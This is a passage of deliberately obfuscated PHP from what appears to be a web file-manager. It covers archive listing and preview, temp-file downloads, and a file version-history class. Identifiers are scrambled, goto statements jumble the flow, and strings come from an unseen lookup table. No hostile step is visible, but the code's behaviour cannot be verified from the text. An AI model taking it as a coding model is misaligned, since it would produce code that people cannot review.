array($F…ê—ôì[75] => $D¡Õ–ç²µ); } } $D¡Õ–ç²µ = $cÜ¶ºÌêôÒ[$F…ê—ôì[75]]; goto aŸ† ‡Äõ¹; a‹ÒÀ‘˜½Ø: foreach ($Aòâ÷¡®™¬ as $c„·šê¡¦œ) { $c„·šê¡¦œ = self::iconvApp($c„·šê¡¦œ); self::move($c„·šê¡¦œ, $D¡Õ–ç²µ, $fµÍøÆÆ»); } del_dir($dº÷Îßƒ´Š); if (!$bĞÑñâ­ºç) { del_file($Aä–ğÕ†„ ); } goto BÁé×Îœ¤; a©¼ĞÍê½: if (!@file_exists(self::iconvSystem($Aä–ğÕ†„ ))) { $bĞÑñâ­ºç = self::localFilePath($Fé‡” ˜ôÙ, $cÙ“†²Š¸); $Aä–ğÕ†„  = $bĞÑñâ­ºç ? $bĞÑñâ­ºç : parent::download($Fé‡” ˜ôÙ, $Aä–ğÕ†„ ); } $Aä–ğÕ†„  = self::iconvSystem($Aä–ğÕ†„ ); $DÇ¥Æ¹ô‰¼ = isset($FÉŠ¥ÏÆô¤[$F…ê—ôì[1063]]) ? $FÉŠ¥ÏÆô¤[$F…ê—ôì[1063]] : $F…ê—ôì[1064]; goto E²¹§ƒ‚; c­§ŠŠ“óÔ: mk_dir($dº÷Îßƒ´Š); $cÙ“†²Š¸ = self::fileExt($c°ã‡›·´Ô); $Aä–ğÕ†„  = $dº÷Îßƒ´Š . $F…ê—ôì[94] . $cÙ“†²Š¸; goto a©¼ĞÍê½; aŸ† ‡Äõ¹: $aÎµæ¦´¨… = self::tmpFileName($c°ã‡›·´Ô); $dº÷Îßƒ´Š = TEMP_FILES . $aÎµæ¦´¨…; del_dir($dº÷Îßƒ´Š); goto c­§ŠŠ“óÔ; d‡êÛŸøäÚ: } public static function unzipList($Aš­ñ¨Ä¨) { goto d³éäâõ½„; FºÒ²Ó¯Í…: $dèÑàÈÛåš = self::iconvSystem($dèÑàÈÛåš); if ($d¢ßê ê”È >= 0) { $c‡øİ«‡¼£ = isset($Aš­ñ¨Ä¨[$DòõÀòØ[1073]]) ? $Aš­ñ¨Ä¨[$DòõÀòØ[1073]] : !1; $AÊœœÇĞ’¼ = isset($Aš­ñ¨Ä¨[$DòõÀòØ[28]]) ? $Aš­ñ¨Ä¨[$DòõÀòØ[28]] : $DòõÀòØ[33]; KodArchive::filePreview($dèÑàÈÛåš, $d¢ßê ê”È, $c‡øİ«‡¼£, $AÊœœÇĞ’¼); self::archiveExt(); die; } $C†è…“ŠÊù = KodArchive::listContent($dèÑàÈÛåš); goto B¶Üà×Ö‡¤; AöÈ˜ï£Ì´: $e†ÉË›‚ƒº = 50000; if (request_url_safe($Cò…àÈ¸ö„)) { $cŒ‡‹»é¿ô = parse_url_query($Cò…àÈ¸ö„); if (!isset($cŒ‡‹»é¿ô[$DòõÀòØ[75]])) { show_json($DòõÀòØ[1070], !1); } } $få¼±„ùí” = isset($cŒ‡‹»é¿ô) ? $cŒ‡‹»é¿ô[$DòõÀòØ[75]] : $Cò…àÈ¸ö„; goto A¨öè‡‘²à; a ¶°Á­çë: $DÂÕ´÷ŒÖ‡ = json_encode($C†è…“ŠÊù[$DòõÀòØ[1067]]); self::setContent($d«Ï ÂÅÚƒ, $DÂÕ´÷ŒÖ‡); if (count($C†è…“ŠÊù[$DòõÀòØ[1067]]) >= $e†ÉË›‚ƒº) { show_json(sprintf(LNG($DòõÀòØ[1071]), count($C†è…“ŠÊù[$DòõÀòØ[1067]])), !1); } goto F¡ÖôºÚÔ÷; F¡ÖôºÚÔ÷: return $C†è…“ŠÊù[$DòõÀòØ[1067]]; goto Bâå„ì¡²; d³éäâõ½„: $DòõÀòØ =& $_SERVER[Æ¼ôºÙï]; $Cò…àÈ¸ö„ = $Aš­ñ¨Ä¨[$DòõÀòØ[75]]; $d¢ßê ê”È = isset($Aš­ñ¨Ä¨[$DòõÀòØ[1069]]) ? $Aš­ñ¨Ä¨[$DòõÀòØ[1069]] : -1; goto AöÈ˜ï£Ì´; f«Ùö¨Íò: if (!is_dir($A·Ìôº“ñ)) { mk_dir($A·Ìôº“ñ); } $dèÑàÈÛåš = $A·Ìôº“ñ . $DòõÀòØ[8] . $Eˆ‰´ø; if (!@file_exists(self::iconvSystem($dèÑàÈÛåš))) { if (isset($cŒ‡‹»é¿ô)) { url_request($Cò…àÈ¸ö„, $DòõÀòØ[1072], $dèÑàÈÛåš); } else { $D´«¶¨Äî¨ = self::localFilePath($Cò…àÈ¸ö„, $E¢Ï™íè±); $dèÑàÈÛåš = $D´«¶¨Äî¨ ? $D´«¶¨Äî¨ : self::download($Cò…àÈ¸ö„, $dèÑàÈÛåš); } } goto FºÒ²Ó¯Í…; B¶Üà×Ö‡¤: self::archiveExt(); del_dir($A·Ìôº“ñ); if (!$C†è…“ŠÊù[$DòõÀòØ[1065]]) { show_json($C†è…“ŠÊù[$DòõÀòØ[1067]], !1); } goto a ¶°Á­çë; A¨öè‡‘²à: $b˜ëÂÓ = self::info($få¼±„ùí”); $E¢Ï™íè± = self::fileExt($b˜ëÂÓ); $C°Ûº¢Ä‡ò = self::tmpFileName($b˜ëÂÓ); goto D“³×öæä; D“³×öæä: if (isset($cŒ‡‹»é¿ô)) { $EÑøêñí„‚ = array($cŒ‡‹»é¿ô[$DòõÀòØ[75]], $cŒ‡‹»é¿ô[$DòõÀòØ[1069]], $cŒ‡‹»é¿ô[$DòõÀòØ[28]]); $Eˆ‰´ø = md5(implode($DòõÀòØ[70], $EÑøêñí„‚)) . $DòõÀòØ[94] . get_path_ext($cŒ‡‹»é¿ô[$DòõÀòØ[28]]); } else { $EÑøêñí„‚ = array($b˜ëÂÓ[$DòõÀòØ[28]], $b˜ëÂÓ[$DòõÀòØ[75]], $b˜ëÂÓ[$DòõÀòØ[77]]); $Eˆ‰´ø = md5(implode($DòõÀòØ[70], $EÑøêñí„‚)) . $DòõÀòØ[94] . $E¢Ï™íè±; } if ($d¢ßê ê”È == -1) { $d«Ï ÂÅÚƒ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\x69\x65\167\57{$C°Ûº¢Ä‡ò}\57{$Eˆ‰´ø}\56\154\x6f\147"; $a´¯ÆÂ‘‡ = self::infoFull($d«Ï ÂÅÚƒ); if ($a´¯ÆÂ‘‡) { $d«Ï ÂÅÚƒ = $a´¯ÆÂ‘‡[$DòõÀòØ[75]]; $Bí¼ÙŠˆ” = self::getContent($d«Ï ÂÅÚƒ); if ($Bí¼ÙŠˆ”) { $DÂÕ´÷ŒÖ‡ = json_decode($Bí¼ÙŠˆ”, !0); if (count($DÂÕ´÷ŒÖ‡) >= $e†ÉË›‚ƒº) { show_json(sprintf(LNG($DòõÀòØ[1071]), count($DÂÕ´÷ŒÖ‡)), !1); } return $DÂÕ´÷ŒÖ‡; } } else { $d«Ï ÂÅÚƒ = self::mkfile($d«Ï ÂÅÚƒ); } } $A·Ìôº“ñ = TEMP_FILES . $C°Ûº¢Ä‡ò; goto f«Ùö¨Íò; Bâå„ì¡²: } private static function fileExt($DôåîË†¦Ü) { $D‹¼ˆÑäİ§ =& $_SERVER[Æ¼ôºÙï]; $Fñ‹—íµÚ† = $DôåîË†¦Ü[$D‹¼ˆÑäİ§[167]]; if ($Fñ‹—íµÚ† == $D‹¼ˆÑäİ§[1074]) { $FšÔŸºœùØ = $D‹¼ˆÑäİ§[1075]; if (substr($DôåîË†¦Ü[$D‹¼ˆÑäİ§[28]], -strlen($FšÔŸºœùØ)) == $FšÔŸºœùØ) { $Fñ‹—íµÚ† = $D‹¼ˆÑäİ§[1076]; } } self::archiveExt($Fñ‹—íµÚ†); return $Fñ‹—íµÚ†; } private static function zipFileList($C¾­Äøõö, $b‚ÈÀÕÍéã = false) { $D ¯Å³ñ± =& $_SERVER[Æ¼ôºÙï]; $eÖù•è‚—Ş = array(); foreach ($C¾­Äøõö as $f´·‚µ˜Ôˆ) { $E¼ÉÚâì• = $f´·‚µ˜Ôˆ[$D ¯Å³ñ±[75]]; if ($b‚ÈÀÕÍéã) { $E¼ÉÚâì• = self::copy($f´·‚µ˜Ôˆ[$D ¯Å³ñ±[75]], $b‚ÈÀÕÍéã, $D ¯Å³ñ±[763]); } else { $f¹º˜»„² = self::init($f´·‚µ˜Ôˆ[$D ¯Å³ñ±[75]]); if ($f¹º˜»„²->getType() == $D ¯Å³ñ±[105]) { $E¼ÉÚâì• = $f¹º˜»„²->path; } } if ($E¼ÉÚâì• && self::local()->exist($E¼ÉÚâì•)) { $eÖù•è‚—Ş[$f´·‚µ˜Ôˆ[$D ¯Å³ñ±[75]]] = $E¼ÉÚâì•; } } if (!empty($eÖù•è‚—Ş)) { return array_values($eÖù•è‚—Ş); } show_json(LNG($D ¯Å³ñ±[1040]), !1); } public static function tmpFileName($DÍ±Ï¥åíÚ) { $DÜ¢Õ™à =& $_SERVER[Æ¼ôºÙï]; $bª¦Š—ïó– = array($DÍ±Ï¥åíÚ[$DÜ¢Õ™à[28]], $DÍ±Ï¥åíÚ[$DÜ¢Õ™à[75]], $DÍ±Ï¥åíÚ[$DÜ¢Õ™à[77]], $DÍ±Ï¥åíÚ[$DÜ¢Õ™à[477]]); return md5(implode($DÜ¢Õ™à[70], $bª¦Š—ïó–)); } private static function localFilePath($f„·Ò²µßŒ, $eáÏ«å£ğÈ) { goto aŒâîâé§; aŒâîâé§: $a†øÚÃí¥ =& $_SERVER[Æ¼ôºÙï]; if ($eáÏ«å£ğÈ == $a†øÚÃí¥[1077] && strtoupper(substr(PHP_OS, 0, 3)) == $a†øÚÃí¥[1078]) { return !1; } $d—ÙÄ²˜– = KodIO::parse($f„·Ò²µßŒ); goto eíØŞï¶¼ ; eíØŞï¶¼ : if ($d—ÙÄ²˜–[$a†øÚÃí¥[29]] == KodIO::KOD_SOURCE) { $C¶Ñ§Óº•Ó = Model($a†øÚÃí¥[770])->fileInfoGet(KodIO::sourceID($f„·Ò²µßŒ)); if (!$C¶Ñ§Óº•Ó[$a†øÚÃí¥[75]]) { show_json($a†øÚÃí¥[1079], !1); } $f„·Ò²µßŒ = $C¶Ñ§Óº•Ó[$a†øÚÃí¥[75]]; } $Bî‰‹ˆãçÈ = self::init($f„·Ò²µßŒ); $eáğ‡Ë‰´ = $Bî‰‹ˆãçÈ->getType(); goto e±ÁÖèÃùÁ; e±ÁÖèÃùÁ: if ($eáğ‡Ë‰´ == $a†øÚÃí¥[105] || $eáğ‡Ë‰´ == $a†øÚÃí¥[1080]) { if (!$Bî‰‹ˆãçÈ->exist($Bî‰‹ˆãçÈ->path)) { show_json(LNG($a†øÚÃí¥[104]), !1); } return $Bî‰‹ˆãçÈ->path; } return !1; goto dÏõàµ´§â; dÏõàµ´§â: } private static function archiveExt($CºŞÊ‘ŒË = '') { $GLOBALS[$_SERVER[Æ¼ôºÙï][1081]] = $CºŞÊ‘ŒË; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto d”˜¦ˆ¾; dö¯’õ—¸á: if (isset($_REQUEST[$eõ·¼¥ÉÌà[1083]]) && $_REQUEST[$eõ·¼¥ÉÌà[1083]] == $eõ·¼¥ÉÌà[86]) { return; } Hook::bind($eõ·¼¥ÉÌà[1084], $eõ·¼¥ÉÌà[1085]); Hook::bind($eõ·¼¥ÉÌà[1086], $eõ·¼¥ÉÌà[1087]); goto A¬ä‹šÎìÀ; d¼ù£¸ä¶Ã: Hook::bind($eõ·¼¥ÉÌà[1094], $eõ·¼¥ÉÌà[1095]); goto BÉëß¥äÇÁ; d”˜¦ˆ¾: $eõ·¼¥ÉÌà =& $_SERVER[Æ¼ôºÙï]; $FºñÆä¬Œ¬ = $GLOBALS[$eõ·¼¥ÉÌà[6]][$eõ·¼¥ÉÌà[87]][$eõ·¼¥ÉÌà[1082]]; if ($FºñÆä¬Œ¬ <= 0) { return; } goto dö¯’õ—¸á; A¬ä‹šÎìÀ: Hook::bind($eõ·¼¥ÉÌà[1088], $eõ·¼¥ÉÌà[1089]); Hook::bind($eõ·¼¥ÉÌà[1090], $eõ·¼¥ÉÌà[1091]); Hook::bind($eõ·¼¥ÉÌà[1092], $eõ·¼¥ÉÌà[1093]); goto d¼ù£¸ä¶Ã; BÉëß¥äÇÁ: } public static function eventBeforeUpload($fàŒò¤Áá×) { if ($fàŒò¤Áá×[3] && $fàŒò¤Áá×[3] != REPEAT_REPLACE) { return; } $e»‡Šƒóå = self::parsePath($fàŒò¤Áá×[0]); if (!$e»‡Šƒóå) { return; } self::add($e»‡Šƒóå); } public static function eventBeforeEdit($EØ½«±÷›‡) { $A§ŞåğªÂ¹ = self::parsePath($EØ½«±÷›‡[0]); if (!$A§ŞåğªÂ¹) { return; } self::add($A§ŞåğªÂ¹); } public static function eventBeforeCopyFile($F§Ğ¾‡ìÇØ, $aÌ¢¨±ªÜ£, $Cœ÷Îîªù˜, $c‡±ºÄ…Š, $AíÈ‚š…ğ†, $C¾’œÍÔ¶™) { $Eëˆªâš¯ = $Cœ÷Îîªù˜->getPathOuter($c‡±ºÄ…Š); $aÇ³Áé‡­ = self::parsePath($Eëˆªâš¯); if (!$aÇ³Áé‡­) { return; } self::add($aÇ³Áé‡­); } public static function eventBeforeRename($e²ëÇÓºƒ) { $cí¹½È‘­ =& $_SERVER[Æ¼ôºÙï]; $F³¢«ÍŠã¼ = self::parsePath($e²ëÇÓºƒ[0]); if (!$F³¢«ÍŠã¼) { return; } $D†…É‹³á™ = self::checkInHistory($F³¢«ÍŠã¼); if (!$D†…É‹³á™) { return; } if ($D†…É‹³á™[$cí¹½È‘­[29]] == $cí¹½È‘­[173]) { $e¿²Ö´ªë = self::listData($F³¢«ÍŠã¼); if ($e¿²Ö´ªë && $e¿²Ö´ªë[$cí¹½È‘­[363]]) { self::moveHistory($F³¢«ÍŠã¼, $e²ëÇÓºƒ[1]); } } else { IO::rename($D†…É‹³á™[$cí¹½È‘­[75]], $e²ëÇÓºƒ[1]); } } public static function eventBeforeMove($fŒ„»¬Ğï¤) { goto bË±ŠÚ«µ; FÙŒ²öà„œ: $BœÖ¤ƒÙÕ = self::checkInHistory($C¶éŸµÃÀ); if (!$BœÖ¤ƒÙÕ) { return; } $C áŞí¶è = self::pathHistory($F‚ÜÓøÖòó); goto e¦äÚ“ÅØê; f°Ê”ù¾Ù”: $F‚ÜÓøÖòó = self::parsePath($fŒ„»¬Ğï¤[1]); if (!$F‚ÜÓøÖòó) { return; } $Aæ²ŒêçÏš = $fŒ„»¬Ğï¤[3]; goto FÙŒ²öà„œ; e¦äÚ“ÅØê: if ($BœÖ¤ƒÙÕ[$e±ï¬Ú½[29]] == $e±ï¬Ú½[173]) { $DÃ±¸ÔŒ¸Ÿ = self::listData($C¶éŸµÃÀ); $E¸İî„¤ = rtrim($F‚ÜÓøÖòó, $e±ï¬Ú½[8]) . $e±ï¬Ú½[8] . ($Aæ²ŒêçÏš ? $Aæ²ŒêçÏš : get_path_this($C¶éŸµÃÀ)); $cìğ³ó„æ« = self::listData($E¸İî„¤); if ($DÃ±¸ÔŒ¸Ÿ && $DÃ±¸ÔŒ¸Ÿ[$e±ï¬Ú½[363]] && $cìğ³ó„æ« && $cìğ³ó„æ«[$e±ï¬Ú½[363]]) { return self::clear($C¶éŸµÃÀ); } if ($DÃ±¸ÔŒ¸Ÿ && $DÃ±¸ÔŒ¸Ÿ[$e±ï¬Ú½[363]]) { self::moveHistory($C¶éŸµÃÀ, $Aæ²ŒêçÏš, $C áŞí¶è); } } else { IO::move($BœÖ¤ƒÙÕ[$e±ï¬Ú½[75]], $C áŞí¶è, !1, $Aæ²ŒêçÏš); self::clearEmptyFolder(IO::pathFather($BœÖ¤ƒÙÕ[$e±ï¬Ú½[75]])); } goto a„ï¿èÁ; bË±ŠÚ«µ: $e±ï¬Ú½ =& $_SERVER[Æ¼ôºÙï]; $C¶éŸµÃÀ = self::parsePath($fŒ„»¬Ğï¤[0]); if (!$C¶éŸµÃÀ) { return; } goto f°Ê”ù¾Ù”; a„ï¿èÁ: } public static function eventAfterRemove($e¶‡§½¿ô±, $cîÁóÏµÃ) { goto b¡šÑº×—×; cÜ„¥†§æ: if ($AŠ’ç³Ûëî[$aïñ‹®„Ç­[29]] == $aïñ‹®„Ç­[173]) { $Aí³á÷ = self::listData($FØ¨‚…µ…’, !1); if ($Aí³á÷ && $Aí³á÷[$aïñ‹®„Ç­[363]]) { self::clear($FØ¨‚…µ…’, !1); } } else { IO::remove($AŠ’ç³Ûëî[$aïñ‹®„Ç­[75]]); self::clearEmptyFolder(IO::pathFather($AŠ’ç³Ûëî[$aïñ‹®„Ç­[75]])); } goto CÜ¸¾¶İí; b¡šÑº×—×: $aïñ‹®„Ç­ =& $_SERVER[Æ¼ôºÙï]; if (!$cîÁóÏµÃ) { return; } $FØ¨‚…µ…’ = self::parsePath($e¶‡§½¿ô±[0]); goto fŒ×´äÆÌ«; fŒ×´äÆÌ«: if (!$FØ¨‚…µ…’) { return; } $AŠ’ç³Ûëî = self::checkInHistory($FØ¨‚…µ…’); if (!$AŠ’ç³Ûëî) { return; } goto cÜ„¥†§æ; CÜ¸¾¶İí: } private static function checkInHistory($bœ¶äÜî˜¡) { $CŒ«¶ãÂ®Ä = self::pathHistory($bœ¶äÜî˜¡); if (!IO::exist($CŒ«¶ãÂ®Ä)) { $CŒ«¶ãÂ®Ä .= $_SERVER[Æ¼ôºÙï][1096]; } return IO::exist($CŒ«¶ãÂ®Ä) ? IO::info($CŒ«¶ãÂ®Ä) : !1; } private static function parsePath($cª´ÚÖƒáÊ) { goto F²´¯æ†é; FÇ±÷“Š‡»: $aì‹£©‡¥Ü = KodIO::parse($cª´ÚÖƒáÊ); $DœÍ Äè­ = $aì‹£©‡¥Ü[$cÊµ“Á¯¤[29]]; $DÉ‡óÑÉ‚» = !$DœÍ Äè­ || $DœÍ Äè­ == KodIO::KOD_IO || $DœÍ Äè­ == KodIO::KOD_SHARE_ITEM; goto bÓ¬éÂÈ§á; F²´¯æ†é: $cÊµ“Á¯¤ =& $_SERVER[Æ¼ôºÙï]; if (!$cª´ÚÖƒáÊ) { return !1; } if ($GLOBALS[$cÊµ“Á¯¤[1097]]) { return; } goto FÇ±÷“Š‡»; bÓ¬éÂÈ§á: if (!$DÉ‡óÑÉ‚» || !$aì‹£©‡¥Ü[$cÊµ“Á¯¤[1098]]) { return !1; } if ($DœÍ Äè­ == KodIO::KOD_SHARE_ITEM) { $F¯î¬Š’áÖ = IO::init($cª´ÚÖƒáÊ); if ($F¯î¬Š’áÖ->pathParse[$cÊµ“Á¯¤[1027]]) { return self::parsePath($F¯î¬Š’áÖ->pathParse[$cÊµ“Á¯¤[1027]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto aØŠª—; B·¹‰Ÿƒì†: return $cª´ÚÖƒáÊ; goto bËòÄ“Æˆ£; aØŠª—: $d˜ÌŒÎ÷øÌ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $cÊµ“Á¯¤[1099]); foreach ($d˜ÌŒÎ÷øÌ as $A½ƒÂ÷î») { if (!$DœÍ Äè­ && substr($cª´ÚÖƒáÊ, 0, strlen($A½ƒÂ÷î»)) == $A½ƒÂ÷î») { return !1; } } self::log($GLOBALS[$cÊµ“Á¯¤[1022]] . $cÊµ“Á¯¤[1100] . $cª´ÚÖƒáÊ); goto B·¹‰Ÿƒì†; bËòÄ“Æˆ£: } private static function pathHistory($Aå§í‰ÌÂ¾) { $aÍ¬ÀÈùà =& $_SERVER[Æ¼ôºÙï]; $F–à¦§Ñ†¸ = self::$_historyBase . ltrim(KodIO::clear($Aå§í‰ÌÂ¾), $aÍ¬ÀÈùà[8]); $F–à¦§Ñ†¸ = str_replace(array($aÍ¬ÀÈùà[1101]), array($aÍ¬ÀÈùà[1102]), $F–à¦§Ñ†¸); return $F–à¦§Ñ†¸; } public static function log($EÏŞÛƒøœ›) { } public static function historyCount($BğÚãµïÓõ) { $E»»Ùìà…  =& $_SERVER[Æ¼ôºÙï]; $B™Êó™ï©ê = array(); $B½©ïŞ„Õˆ = array(); foreach ($BğÚãµïÓõ as $d‡ßñê­Œ) { $FÕÚ‚ğÆ‘È = get_path_father($d‡ßñê­Œ); if (!$B½©ïŞ„Õˆ[$FÕÚ‚ğÆ‘È]) { $B½©ïŞ„Õˆ[$FÕÚ‚ğÆ‘È] = array(); } $B½©ïŞ„Õˆ[$FÕÚ‚ğÆ‘È][] = get_path_this($d‡ßñê­Œ); } foreach ($B½©ïŞ„Õˆ as $FÕÚ‚ğÆ‘È => $DÏ™«Š‰ƒÌ) { $eŞ»ÊÂåÑ˜ = self::parsePath($FÕÚ‚ğÆ‘È); if (!$eŞ»ÊÂåÑ˜) { continue; } foreach ($DÏ™«Š‰ƒÌ as $f®¼È“®Æ÷) { $cñÕõ¥ÏçÁ = self::listData(rtrim($eŞ»ÊÂåÑ˜, $E»»Ùìà… [8]) . $E»»Ùìà… [8] . $f®¼È“®Æ÷, !1); if ($cñÕõ¥ÏçÁ && $cñÕõ¥ÏçÁ[$E»»Ùìà… [363]]) { $B™Êó™ï©ê[rtrim($FÕÚ‚ğÆ‘È, $E»»Ùìà… [8]) . $E»»Ùìà… [8] . $f®¼È“®Æ÷] = count($cñÕõ¥ÏçÁ[$E»»Ùìà… [363]]); } } } return $B™Êó™ï©ê; } public static function add($a„¹áï„°¾) { goto D…Ù›ßîõ; D…Ù›ßîõ: $c ÓåøËôí =& $_SERVER[Æ¼ôºÙï]; $Cª‡å£Äí = self::listData($a„¹áï„°¾); if (!$Cª‡å£Äí) { return; } goto b™×ĞáÆ‡; C‡‰¤¹ïÂ: return self::saveData($Cª‡å£Äí[$c ÓåøËôí[1109]], $cŒì²†·àÇ); goto D‹ÆÍìå¾; A­§¹êòª“: $cŒì²†·àÇ = $Cª‡å£Äí[$c ÓåøËôí[363]]; if ($b‘Àˆ“öœø[$c ÓåøËôí[77]] == 0) { return; } if ($b‘Àˆ“öœø[$c ÓåøËôí[77]] >= 1024 * 1024 * 500) { return !1; } goto fÂá¤¯¨¯; b™×ĞáÆ‡: $B™²•åè‹‘ = Model($c ÓåøËôí[1103])->get($c ÓåøËôí[1104]); $FœĞí™¥³¬ = $GLOBALS[$c ÓåøËôí[6]][$c ÓåøËôí[87]][$c ÓåøËôí[1082]]; $B¡ñŠˆÅÎ = $B™²•åè‹‘ == $c ÓåøËôí[1105] ? 5 : $FœĞí™¥³¬; goto b­¬›©å›¤; b­¬›©å›¤: if ($FœĞí™¥³¬ <= 0) { return; } $Eªøó³…« = IO::hashSimple($a„¹áï„°¾); $b‘Àˆ“öœø = IO::info($a„¹áï„°¾); goto A­§¹êòª“; fÂá¤¯¨¯: if ($cŒì²†·àÇ && $cŒì²†·àÇ[0][$c ÓåøËôí[170]] == $Eªøó³…«) { return !0; } if (array_key_exists($c ÓåøËôí[194], $b‘Àˆ“öœø) && !$b‘Àˆ“öœø[$c ÓåøËôí[194]]) { return !1; } $d¢«Ò¹”ŒÃ = short_id(time()); goto b¥ç¬ã‚ò; b¥ç¬ã‚ò: $E¡·ß•á„ = array($c ÓåøËôí[385] => $d¢«Ò¹”ŒÃ, $c ÓåøËôí[170] => $Eªøó³…«, $c ÓåøËôí[28] => $b‘Àˆ“öœø[$c ÓåøËôí[28]] . $c ÓåøËôí[94] . date($c ÓåøËôí[1106]) . rand_string(1), $c ÓåøËôí[77] => $b‘Àˆ“öœø[$c ÓåøËôí[77]], $c ÓåøËôí[396] => USER_ID, $c ÓåøËôí[192] => time(), $c ÓåøËôí[1107] => $c ÓåøËôí[33]); IO::mkdir($Cª‡å£Äí[$c ÓåøËôí[1108]]); $CÓí±…è›› = IO::copy($a„¹áï„°¾, $Cª‡å£Äí[$c ÓåøËôí[1108]], !1, $E¡·ß•á„[$c ÓåøËôí[28]]); goto CµÎŸ˜¶®·; CµÎŸ˜¶®·: if (!$CÓí±…è››) { self::clearEmptyFolder($Cª‡å£Äí[$c ÓåøËôí[1108]]); return !1; } array_unshift($cŒì²†·àÇ, $E¡·ß•á„); if (count($cŒì²†·àÇ) > $B¡ñŠˆÅÎ) { $F¹ÈÃÖô¸ = array_slice($cŒì²†·àÇ, $B¡ñŠˆÅÎ); foreach ($F¹ÈÃÖô¸ as $Bóƒ­Ø‡½ê) { IO::remove($Cª‡å£Äí[$c ÓåøËôí[1108]] . $Bóƒ­Ø‡½ê[$c ÓåøËôí[28]]); } $cŒì²†·àÇ = array_slice($cŒì²†·àÇ, 0, $B¡ñŠˆÅÎ); } goto C‡‰¤¹ïÂ; D‹ÆÍìå¾: } public static function remove($FÎ–Î‹ ÛÂ, $f½ÁÊ¸ïŞ) { $Cå¬÷ØÚ° =& $_SERVER[Æ¼ôºÙï]; $cÙÈ²“›æ = self::listData($FÎ–Î‹ ÛÂ); $f ±ØÔß–« = array(); if (!$cÙÈ²“›æ) { return !1; } foreach ($cÙÈ²“›æ[$Cå¬÷ØÚ°[363]] as $e—Üµ†¯Ì) { if ($e—Üµ†¯Ì[$Cå¬÷ØÚ°[385]] == $f½ÁÊ¸ïŞ) { IO::remove($cÙÈ²“›æ[$Cå¬÷ØÚ°[1108]] . $e—Üµ†¯Ì[$Cå¬÷ØÚ°[28]]); continue; } $f ±ØÔß–«[] = $e—Üµ†¯Ì; } return self::saveData($cÙÈ²“›æ[$Cå¬÷ØÚ°[1109]], $f ±ØÔß–«); } public static function clear($eò…òÓ»„, $f¹“¢Â²¾ = true) { $a‰‹‹µà =& $_SERVER[Æ¼ôºÙï]; $D¢ßƒÜõØ = self::listData($eò…òÓ»„, $f¹“¢Â²¾); if (!$D¢ßƒÜõØ) { return !1; } foreach ($D¢ßƒÜõØ[$a‰‹‹µà[363]] as $dÀ´Œ‰£Ø¸) { IO::remove($D¢ßƒÜõØ[$a‰‹‹µà[1108]] . $dÀ´Œ‰£Ø¸[$a‰‹‹µà[28]]); } return self::saveData($D¢ßƒÜõØ[$a‰‹‹µà[1109]], array()); } public static function moveHistory($CğÊŠ½İĞ, $cñå®ºÑ‘¿ = '', $F÷–†í‡ØŒ = '') { goto BÙØ˜¥â†; aŠµÌø†“: self::saveData($Bèº”ÉêÎ[$B¢ßÅĞøÙ[1109]], $Bèº”ÉêÎ[$B¢ßÅĞøÙ[363]]); self::clearEmptyFolder($Bèº”ÉêÎ[$B¢ßÅĞøÙ[1108]]); goto f¢œÒáîì¦; Eø‡Û¦Ì×¸: $BÙÄ¡êçÊ¿ = substr(get_path_this($Bèº”ÉêÎ[$B¢ßÅĞøÙ[1109]]), 0, -strlen($DÑŠËˆ¶ŠÉ)); foreach ($Bèº”ÉêÎ[$B¢ßÅĞøÙ[363]] as $D½¡á¹ÓìÛ => $Dõ—óß¢ª¬) { $AÕÔ¾àæ¬ = $cñå®ºÑ‘¿ . substr($Dõ—óß¢ª¬[$B¢ßÅĞøÙ[28]], strlen($BÙÄ¡êçÊ¿)); $b†˜ŸÙª = IO::move($Bèº”ÉêÎ[$B¢ßÅĞøÙ[1108]] . $Dõ—óß¢ª¬[$B¢ßÅĞøÙ[28]], $F÷–†í‡ØŒ, !1, $AÕÔ¾àæ¬); if ($b†˜ŸÙª) { $Bèº”ÉêÎ[$B¢ßÅĞøÙ[363]][$D½¡á¹ÓìÛ][$B¢ßÅĞøÙ[28]] = $AÕÔ¾àæ¬; } } $Bèº”ÉêÎ[$B¢ßÅĞøÙ[1109]] = IO::move($Bèº”ÉêÎ[$B¢ßÅĞøÙ[1109]], $F÷–†í‡ØŒ, !1, $cñå®ºÑ‘¿ . $DÑŠËˆ¶ŠÉ); goto aŠµÌø†“; fƒ†ê²ïˆ: $DÑŠËˆ¶ŠÉ = $B¢ßÅĞøÙ[1096]; $cñå®ºÑ‘¿ = $cñå®ºÑ‘¿ ? $cñå®ºÑ‘¿ : get_path_this($CğÊŠ½İĞ); $F÷–†í‡ØŒ = $F÷–†í‡ØŒ ? $F÷–†í‡ØŒ : $Bèº”ÉêÎ[$B¢ßÅĞøÙ[1108]]; goto Eø‡Û¦Ì×¸; BÙØ˜¥â†: $B¢ßÅĞøÙ =& $_SERVER[Æ¼ôºÙï]; $Bèº”ÉêÎ = self::listData($CğÊŠ½İĞ, !1); if (!$Bèº”ÉêÎ || !$Bèº”ÉêÎ[$B¢ßÅĞøÙ[363]]) { return !1; } goto fƒ†ê²ïˆ; f¢œÒáîì¦: } public static function rollback($f›Á½²ÍÛ, $E×­è„×õŒ) { $b‘Òôò¹ÁÖ =& $_SERVER[Æ¼ôºÙï]; $bŠéÎê†Ú… = self::listData($f›Á½²ÍÛ); if (!$bŠéÎê†Ú…) { return; } $B¿º“¥”Öá = IO::info($f›Á½²ÍÛ); foreach ($bŠéÎê†Ú…[$b‘Òôò¹ÁÖ[363]] as $f‚ö¡²¦ => $bè–†×ëÌÓ) { if ($bè–†×ëÌÓ[$b‘Òôò¹ÁÖ[385]] == $E×­è„×õŒ) { self::add($f›Á½²ÍÛ); $C‰š”ëç¤ã = $bŠéÎê†Ú…[$b‘Òôò¹ÁÖ[1108]] . $bè–†×ëÌÓ[$b‘Òôò¹ÁÖ[28]]; $cªè‡òêê‘ = IO::copy($C‰š”ëç¤ã, IO::pathFather($f›Á½²ÍÛ), REPEAT_REPLACE, $B¿º“¥”Öá[$b‘Òôò¹ÁÖ[28]]); if ($cªè‡òêê‘) { self::remove($f›Á½²ÍÛ, $E×­è„×õŒ); } return $cªè‡òêê‘; } } return !1; } public static function setDetail($d–Ó‡«³Óš, $b¢Å½ê–Óî, $A¿Å•’º›Ù) { $e…ËÒÍ¿•‡ =& $_SERVER[Æ¼ôºÙï]; $Bá–—Éùè¥ = self::listData($d–Ó‡«³Óš); if (!$Bá–—Éùè¥) { return; } foreach 